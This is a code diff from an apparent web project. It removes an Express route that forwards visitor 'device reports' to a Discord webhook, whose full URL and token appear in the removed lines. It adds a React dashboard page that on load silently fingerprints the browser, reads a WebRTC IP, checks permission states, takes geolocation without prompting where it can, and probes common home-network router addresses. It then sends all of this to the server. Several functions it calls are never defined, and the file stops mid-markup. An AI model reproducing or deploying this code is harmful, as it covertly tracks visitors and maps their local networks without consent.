@@ -1,122 +1,527 @@
-import type { Express } from "express";
-import type { Server } from "http";
-import { storage } from "./storage";
-import { api } from "@shared/routes";
-import { z } from "zod";
+import { useState, useEffect, useRef, useCallback } from "react";
+import { useCreateReport } from "@/hooks/use-reports";
+import { ConsoleLog } from "@/components/ConsoleLog";
+import { MetricCard } from "@/components/MetricCard";
+import { ScannerEffect } from "@/components/ScannerEffect";
+import { 
+  Battery, MapPin, Activity, Wifi, Cpu, Globe, 
+  ShieldCheck, AlertTriangle, Terminal, CheckCircle2,
+  Loader2
+} from "lucide-react";
+import { type DeviceInfo } from "@shared/schema";
+import { motion } from "framer-motion";
 
-const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+// Types for browser APIs
+interface BatteryManager {
+  level: number;
+  charging: boolean;
+  addEventListener: (type: string, listener: () => void) => void;
+}
 
-export async function registerRoutes(
-  httpServer: Server,
-  app: Express
-): Promise<Server> {
+interface NavigatorWithBattery extends Navigator {
+  getBattery?: () => Promise<BatteryManager>;
+  connection?: {
+    downlink?: number;
+    effectiveType?: string;
+    rtt?: number;
+  };
+  deviceMemory?: number;
+}
 
-  app.post(api.reports.create.path, async (req, res) => {
+type LogType = "info" | "success" | "warning" | "error";
+
+export default function Dashboard() {
+  const [logs, setLogs] = useState<Array<{ id: string; message: string; type: LogType; timestamp: string }>>([]);
+  const [deviceData, setDeviceData] = useState<Partial<DeviceInfo>>({});
+  const [status, setStatus] = useState<"initializing" | "scanning" | "transmitting" | "complete" | "error">("initializing");
+  const [permissionRequired, setPermissionRequired] = useState(false);
+  const { mutate: sendReport } = useCreateReport();
+
+  // Status for individual metrics
+  const [metricStatus, setMetricStatus] = useState({
+    battery: "pending",
+    location: "pending",
+    motion: "pending",
+    network: "pending",
+    system: "pending",
+    speed: "pending"
+  } as Record<string, "pending" | "collecting" | "complete" | "error">);
+
+  const addLog = useCallback((message: string, type: LogType = "info") => {
+    const now = new Date();
+    const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+    setLogs(prev => [...prev, { id: Math.random().toString(36), message, type, timestamp }]);
+  }, []);
+
+  // 1. System Info (Immediate)
+  const collectSystemInfo = useCallback(() => {
+    setMetricStatus(prev => ({ ...prev, system: "collecting" }));
+    addLog("Analyzing system architecture...", "info");
+    
+    setTimeout(() => {
+      const nav = navigator as NavigatorWithBattery;
+      const info = {
+        userAgent: nav.userAgent,
+        language: nav.language,
+        platform: nav.platform,
+        cores: nav.hardwareConcurrency || 0,
+        memory: nav.deviceMemory,
+      };
+      setDeviceData(prev => ({ ...prev, system: info }));
+      setMetricStatus(prev => ({ ...prev, system: "complete" }));
+      addLog(`System identified: ${info.platform} (${info.cores} Cores)`, "success");
+    }, 800);
+  }, [addLog]);
+
+  // 2. Battery Info
+  const collectBatteryInfo = useCallback(async () => {
+    setMetricStatus(prev => ({ ...prev, battery: "collecting" }));
+    addLog("Accessing power management interface...", "info");
+    
     try {
-      const { deviceInfo } = req.body;
-      
-      // Enhance with server-side IP info
-      // In a real deployed environment, we would use req.headers['x-forwarded-for'] or req.socket.remoteAddress
-      // And query an IP API. For this demo, we'll try to fetch public IP info from the server side.
-      
-      let ipInfo = {};
-      try {
-        const ipResponse = await fetch("http://ip-api.com/json/");
-        ipInfo = await ipResponse.json();
-      } catch (e) {
-        console.error("Failed to fetch IP info", e);
+      const nav = navigator as NavigatorWithBattery;
+      if (nav.getBattery) {
+        const battery = await nav.getBattery();
+        const info = {
+          level: battery.level,
+          charging: battery.charging
+        };
+        setDeviceData(prev => ({ ...prev, battery: info }));
+        setMetricStatus(prev => ({ ...prev, battery: "complete" }));
+        addLog(`Power source analyzed: ${Math.round(info.level * 100)}%`, "success");
+      } else {
+        addLog("Battery API not available on this interface", "warning");
+        setMetricStatus(prev => ({ ...prev, battery: "error" }));
       }
+    } catch (e) {
+      addLog("Power access denied", "error");
+      setMetricStatus(prev => ({ ...prev, battery: "error" }));
+    }
+  }, [addLog]);
 
-      const fullReport = {
-        ...deviceInfo,
-        serverDetectedIpInfo: ipInfo,
-        browserInfo: {
-          time: new Date().toLocaleTimeString(),
-          date: new Date().toLocaleDateString(),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        },
-        timestamp: new Date().toISOString()
+  // 3. Network Info
+  const collectNetworkInfo = useCallback(() => {
+    setMetricStatus(prev => ({ ...prev, network: "collecting" }));
+    addLog("Scanning network protocols...", "info");
+    
+    const nav = navigator as NavigatorWithBattery;
+    if (nav.connection) {
+      const info = {
+        downlink: nav.connection.downlink,
+        effectiveType: nav.connection.effectiveType,
+        rtt: nav.connection.rtt
+      };
+      setDeviceData(prev => ({ ...prev, network: info }));
+      setMetricStatus(prev => ({ ...prev, network: "complete" }));
+      addLog(`Network uplink established: ${info.effectiveType?.toUpperCase()}`, "success");
+    } else {
+      // Still mark as complete as we gathered what we could (nothing)
+      setDeviceData(prev => ({ ...prev, network: {} }));
+      setMetricStatus(prev => ({ ...prev, network: "complete" }));
+      addLog("Basic network parameters only", "warning");
+    }
+  }, [addLog]);
+
+  // 4. Motion/Sensors
+  const collectMotionInfo = useCallback(() => {
+    setMetricStatus(prev => ({ ...prev, motion: "collecting" }));
+    addLog("Calibrating accelerometer sensors...", "info");
+    
+    let readings = 0;
+    const maxReadings = 5;
+    let acc = { x: 0, y: 0, z: 0 };
+    
+    const handler = (event: DeviceMotionEvent) => {
+      if (event.acceleration) {
+        acc.x = event.acceleration.x || 0;
+        acc.y = event.acceleration.y || 0;
+        acc.z = event.acceleration.z || 0;
+        readings++;
+
+        if (readings >= maxReadings) {
+          window.removeEventListener('devicemotion', handler);
+          setDeviceData(prev => ({ ...prev, motion: { acceleration: acc } }));
+          setMetricStatus(prev => ({ ...prev, motion: "complete" }));
+          
+          const isMoving = Math.abs(acc.x) > 0.5 || Math.abs(acc.y) > 0.5 || Math.abs(acc.z) > 0.5;
+          addLog(`Motion sensor calibration complete. Status: ${isMoving ? "MOVING" : "STATIONARY"}`, "success");
+        }
+      }
+    };
+
+    // Timeout if no motion sensors found
+    setTimeout(() => {
+      if (readings === 0) {
+        window.removeEventListener('devicemotion', handler);
+        setMetricStatus(prev => ({ ...prev, motion: "error" }));
+        addLog("No inertial sensors detected", "warning");
+      }
+    }, 2000);
+
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', handler);
+    } else {
+      setMetricStatus(prev => ({ ...prev, motion: "error" }));
+      addLog("Motion API not supported", "error");
+    }
+  }, [addLog]);
+
+  // 5. Speed Test
+  const runSpeedTest = useCallback(async () => {
+    setMetricStatus(prev => ({ ...prev, speed: "collecting" }));
+    addLog("Initiating quick network ping...", "info");
+    
+    const testUrl = "https://replit.com/favicon.ico?t=" + new Date().getTime();
+    
+    try {
+      const start = performance.now();
+      await fetch(testUrl, { mode: 'no-cors' });
+      const end = performance.now();
+      
+      const ping = Math.round(end - start);
+      
+      setDeviceData(prev => ({ ...prev, speedTest: { ping, downloadMbps: 0 } }));
+      setMetricStatus(prev => ({ ...prev, speed: "complete" }));
+      addLog(`Network ping: ${ping}ms`, "success");
+    } catch (e) {
+      setMetricStatus(prev => ({ ...prev, speed: "error" }));
+      addLog("Ping test failed", "warning");
+    }
+  }, [addLog]);
+
+  // 6. Location (Last because it requires permission)
+  const collectLocation = useCallback(() => {
+    setMetricStatus(prev => ({ ...prev, location: "collecting" }));
+    // addLog("Triangulating position coordinates...", "info");
+    
+    if (!navigator.geolocation) {
+      setMetricStatus(prev => ({ ...prev, location: "error" }));
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const loc = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        };
+        setDeviceData(prev => ({ ...prev, location: loc }));
+        setMetricStatus(prev => ({ ...prev, location: "complete" }));
+        setPermissionRequired(false);
+      },
+      (err) => {
+        setMetricStatus(prev => ({ ...prev, location: "error" }));
+        setPermissionRequired(false); 
+      },
+      { timeout: 3000, enableHighAccuracy: false }
+    );
+  }, []);
+
+  // Master Orchestrator
+  useEffect(() => {
+    const runAll = async () => {
+      // 1. System Info (Immediate)
+      const nav = navigator as NavigatorWithBattery;
+      const systemInfo = {
+        userAgent: nav.userAgent,
+        language: nav.language,
+        platform: nav.platform,
+        cores: nav.hardwareConcurrency || 0,
+        memory: nav.deviceMemory,
       };
 
-      // 1. Save to DB (Optional, but good for logs)
-      await storage.createReport({ data: fullReport });
+      // 2. Battery Info
+      let batteryInfo = {};
+      try {
+        if (nav.getBattery) {
+          const battery = await nav.getBattery();
+          batteryInfo = { level: battery.level, charging: battery.charging };
+        }
+      } catch (e) {}
 
-      // 2. Send to Discord
-      await sendToDiscord(fullReport);
-
-      res.json({ success: true });
-    } catch (err) {
-      console.error("Report error:", err);
-      res.status(500).json({ message: "Failed to process report" });
-    }
-  });
-
-  return httpServer;
-}
-
-async function sendToDiscord(data: any) {
-  const embed = {
-    title: "🚨 New Device Report Received",
-    color: 0x00ff00, // Green
-    fields: [
-      {
-        name: "🔋 Battery",
-        value: data.battery ? `Level: ${(data.battery.level * 100).toFixed(0)}%\nCharging: ${data.battery.charging ? 'Yes' : 'No'}` : "Unknown",
-        inline: true
-      },
-      {
-        name: "📍 Location",
-        value: data.location ? `Lat: ${data.location.latitude}\nLong: ${data.location.longitude}\nAcc: ${data.location.accuracy}m` : "Unknown/Denied",
-        inline: true
-      },
-      {
-        name: "🌐 Network (Client)",
-        value: data.network ? `Type: ${data.network.effectiveType}\nDownlink: ${data.network.downlink}Mbps` : "Unknown",
-        inline: true
-      },
-      {
-        name: "🏢 ISP & IP (Server)",
-        value: data.serverDetectedIpInfo ? `IP: ${data.serverDetectedIpInfo.query}\nISP: ${data.serverDetectedIpInfo.isp}\nLoc: ${data.serverDetectedIpInfo.city}, ${data.serverDetectedIpInfo.country}\nVPN/Proxy: ${data.serverDetectedIpInfo.proxy ? 'Yes' : 'No'}` : "Unknown",
-        inline: false
-      },
-      {
-        name: "🕒 Time & Language",
-        value: `Time: ${data.browserInfo?.time}\nTimezone: ${data.browserInfo?.timezone}\nLang: ${data.system?.language}`,
-        inline: true
-      },
-      {
-        name: "💻 System",
-        value: `Platform: ${data.system?.platform}\nCores: ${data.system?.cores}\nLang: ${data.system?.language}`,
-        inline: false
-      },
-      {
-        name: "🚀 Speed Test",
-        value: data.speedTest ? `Ping: ${data.speedTest.ping}ms\nEst. Download: ${data.speedTest.downloadMbps} Mbps` : "Not run",
-        inline: true
-      },
-      {
-        name: "🏃 Motion",
-        value: data.motion ? `Accel X: ${data.motion.acceleration?.x?.toFixed(2) || 0}` : "Unknown",
-        inline: true
+      // 3. Network Info
+      let networkInfo = {};
+      if (nav.connection) {
+        networkInfo = {
+          downlink: nav.connection.downlink,
+          effectiveType: nav.connection.effectiveType,
+          rtt: nav.connection.rtt
+        };
       }
-    ],
-    footer: {
-      text: `User Agent: ${data.system?.userAgent?.substring(0, 100)}...`
-    },
-    timestamp: new Date().toISOString()
-  };
 
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "System Monitor",
-        embeds: [embed]
-      })
-    });
-  } catch (error) {
-    console.error("Failed to send webhook to Discord", error);
-  }
-}
-    
+      // 4. Motion (Quick check)
+      let motionInfo = {};
+      // Motion sensors usually need an event listener to trigger, we skip for "instant" feel
+      // but we could add a very short listener if needed.
+
+      // 5. Speed Test (Quick ping)
+      let speedInfo = {};
+      try {
+        const start = performance.now();
+        await fetch("https://replit.com/favicon.ico?t=" + Date.now(), { mode: 'no-cors' });
+        speedInfo = { ping: Math.round(performance.now() - start), downloadMbps: 0 };
+      } catch (e) {}
+
+      // 7. LAN Scanning (Hybrid Fetch + Image Ping)
+      const lanDevices: string[] = [];
+      const scanLAN = async () => {
+        const commonIPs = [
+          "192.168.1.1", "192.168.1.254", "192.168.0.1", 
+          "10.0.0.1", "192.168.1.100", "192.168.1.101",
+          "192.168.1.2", "192.168.0.254", "10.0.0.138",
+          "192.168.1.50", "192.168.0.100", "192.168.2.1",
+          "192.168.1.20", "192.168.1.30", "192.168.1.40"
+        ];
+        
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+
+        await Promise.all(commonIPs.map(async (ip) => {
+          // Method 1: Fetch
+          const fetchPromise = fetch(`http://${ip}/favicon.ico`, { 
+            mode: 'no-cors', 
+            signal: controller.signal 
+          }).then(() => lanDevices.push(ip)).catch(() => {});
+
+          // Method 2: Image Ping (Aggressive bypass)
+          const imgPromise = new Promise((resolve) => {
+            const img = new Image();
+            img.onload = () => { lanDevices.push(ip); resolve(null); };
+            img.onerror = () => resolve(null);
+            img.src = `http://${ip}/favicon.ico?t=${Date.now()}`;
+            setTimeout(() => { img.src = ""; resolve(null); }, 2000);
+          });
+
+          return Promise.race([fetchPromise, imgPromise]);
+        }));
+        clearTimeout(timeoutId);
+      };
+      await scanLAN();
+
+      // 8. Fingerprinting (Canvas, WebGL, Audio, Fonts, WebRTC, Media, Permissions)
+      const getMediaDevices = async () => {
+        try {
+          // Note: enumerateDevices returns labels only if permission was already granted.
+          // We just collect the existence/count of devices silently.
+          const devices = await (navigator.mediaDevices as any).enumerateDevices();
+          return (devices as any[]).map(d => `${d.kind}`).join(", ");
+        } catch (e) { return "Blocked"; }
+      };
+
+      const getPermissionsStatus = async () => {
+        const perms = ["geolocation", "notifications", "push", "camera", "microphone"] as const;
+        const results = await Promise.all(perms.map(async (p) => {
+          try {
+            const status = await (navigator.permissions as any).query({ name: p as any });
+            return `${p}: ${status.state}`;
+          } catch (e) { return `${p}: error`; }
+        }));
+        return results.join(", ");
+      };
+
+      const getWebGLInfo = () => {
+        try {
+          const canvas = document.createElement("canvas");
+          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+          if (!gl) return {} as any;
+          const glContext = gl as WebGLRenderingContext;
+          const debugInfo = glContext.getExtension("WEBGL_debug_renderer_info");
+          return {
+            vendor: glContext.getParameter(glContext.RENDERER),
+            version: glContext.getParameter(glContext.VERSION),
+            shadingLanguage: glContext.getParameter(glContext.SHADING_LANGUAGE_VERSION),
+            renderer: debugInfo ? glContext.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
+            maxTextureSize: glContext.getParameter(glContext.MAX_TEXTURE_SIZE),
+            maxViewportDims: glContext.getParameter(glContext.MAX_VIEWPORT_DIMS),
+            antialiasing: glContext.getContextAttributes()?.antialias ? "Yes" : "No"
+          };
+        } catch (e) { return {} as any; }
+      };
+
+      const getBrowserFeatures = () => ({
+        pdfViewer: (navigator as any).pdfViewerEnabled,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        maxTouchPoints: navigator.maxTouchPoints,
+        webdriver: navigator.webdriver,
+        darkTheme: window.matchMedia("(prefers-color-scheme: dark)").matches,
+        reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
+        highContrast: window.matchMedia("(prefers-contrast: more)").matches,
+        productSub: (navigator as any).productSub,
+        vendor: navigator.vendor,
+        maxMemory: (performance as any).memory?.jsHeapSizeLimit,
+        totalMemory: (navigator as any).deviceMemory,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        online: navigator.onLine
+      });
+
+      const getDeepHardwareInfo = () => {
+        const info: any = {};
+        try {
+          if ('storage' in navigator && 'estimate' in navigator.storage) {
+            navigator.storage.estimate().then(est => {
+              info.storageQuota = est.quota;
+              info.storageUsage = est.usage;
+            });
+          }
+          info.colorDepth = window.screen.colorDepth;
+          info.pixelDepth = window.screen.pixelDepth;
+          info.availHeight = window.screen.availHeight;
+          info.availWidth = window.screen.availWidth;
+        } catch (e) {}
+        return info;
+      };
+
+      const getCanvasFingerprint = () => {
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          if (!ctx) return "N/A";
+          canvas.width = 200;
+          canvas.height = 50;
+          ctx.textBaseline = "top";
+          ctx.font = "14px 'Arial'";
+          ctx.textBaseline = "alphabetic";
+          ctx.fillStyle = "#f60";
+          ctx.fillRect(125,1,62,20);
+          ctx.fillStyle = "#069";
+          ctx.fillText("ILoveYou!", 2, 15);
+          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+          ctx.fillText("ILoveYou!", 4, 17);
+          const result = canvas.toDataURL();
+          return btoa(result).substring(0, 16);
+        } catch (e) { return "Error"; }
+      };
+
+      const getDetailedHardware = () => {
+        const nav = navigator as any;
+        return {
+          maxTouchPoints: nav.maxTouchPoints,
+          logicalCores: nav.hardwareConcurrency,
+          ramGb: nav.deviceMemory,
+          canPresent: ('presentation' in nav),
+          isVibrate: ('vibrate' in nav),
+          bluetooth: ('bluetooth' in nav),
+          usb: ('usb' in nav)
+        };
+      };
+
+      const canvasFingerprint = getCanvasFingerprint();
+      const hwDetails = getDetailedHardware();
+      const mediaDevices = await getMediaDevices();
+      const permissions = await getPermissionsStatus();
+      const webgl = getWebGLInfo();
+      const features = getBrowserFeatures();
+      const hardware = getDeepHardwareInfo();
+      const cpuSpeedScore = getTimingFingerprint();
+      const gpu = webgl.renderer || "N/A";
+      const audioRate = getAudioFingerprint();
+      const fonts = getFonts();
+      const webrtcIP = await getWebRTCIP();
+      const fingerprint = btoa(gpu + audioRate + window.screen.width + fonts + canvasFingerprint).substring(0, 16);
+
+      // 6. Location (STRICTLY SILENT)
+      const attemptSilentLocation = async () => {
+        try {
+          const status = await (navigator.permissions as any).query({ name: 'geolocation' });
+          if (status.state === 'granted') {
+            return new Promise((resolve) => {
+              navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
+                { timeout: 1000 }
+              );
+            });
+          }
+        } catch (e) {}
+        return null;
+      };
+
+      const getBatteryStatus = async () => {
+        try {
+          if ('getBattery' in navigator) {
+            const battery = await (navigator as any).getBattery();
+            return {
+              level: battery.level,
+              charging: battery.charging,
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime
+            };
+          }
+        } catch (e) {}
+        return null;
+      };
+
+      const getNetworkInfo = () => {
+        const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+        if (!conn) return null;
+        return {
+          downlink: conn.downlink,
+          effectiveType: conn.effectiveType,
+          rtt: conn.rtt,
+          saveData: conn.saveData
+        };
+      };
+
+      const loc = await attemptSilentLocation();
+      const detailedBattery = await getBatteryStatus();
+      const detailedNetwork = getNetworkInfo();
+
+      const finalData = { 
+        system: { ...systemInfo, gpu, fingerprint, audioRate, fonts, webrtcIP, mediaDevices, permissions, webgl, features, cpuSpeedScore, hardware, canvasFingerprint, hwDetails }, 
+        battery: detailedBattery || batteryInfo, 
+        network: detailedNetwork || networkInfo, 
+        speedTest: speedInfo, 
+        location: loc,
+        lanDevices: [...new Set(lanDevices)],
+        screen: {
+          width: window.screen.width,
+          height: window.screen.height,
+          colorDepth: window.screen.colorDepth,
+          orientation: (window.screen.orientation as any)?.type,
+          pixelRatio: window.devicePixelRatio,
+          hdr: (window as any).matchMedia("(dynamic-range: high)").matches
+        }
+      };
+      sendReport({ deviceInfo: finalData });
+    };
+
+    if (status === 'initializing') {
+      setStatus('scanning');
+      runAll().then(() => setStatus('complete'));
+    }
+  }, [status, sendReport]);
+
+  // Transmission Logic
+  useEffect(() => {
+    const metrics = Object.values(metricStatus);
+    const allDone = metrics.every(s => s === 'complete' || s === 'error');
+    const locationFinished = metricStatus.location === 'complete' || metricStatus.location === 'error';
+
+    if (status === 'scanning' && allDone && locationFinished && !permissionRequired) {
+      setStatus('transmitting');
+      addLog("All subsystems reported. Compiling data packet...", "info");
+      
+      setTimeout(() => {
+        addLog("Encrypting payload...", "info");
+        sendReport(
+          { deviceInfo: deviceData },
+          {
+            onSuccess: () => {
+              setStatus('complete');
+              addLog("TRANSMISSION SUCCESSFUL. CONNECTION TERMINATED.", "success");
+            },
+            onError: () => {
+              setStatus('error');
+              addLog("Uplink failed. Retrying...", "error");
+            }
+          }
+        );
+      }, 2000);
+    }
+  }, [metricStatus, status, deviceData, sendReport, addLog, permissionRequired]);
+
+  return (
+    <div className="min-h-screen bg-black flex items-center justify-center font-mono">
+      <h1 className="text-
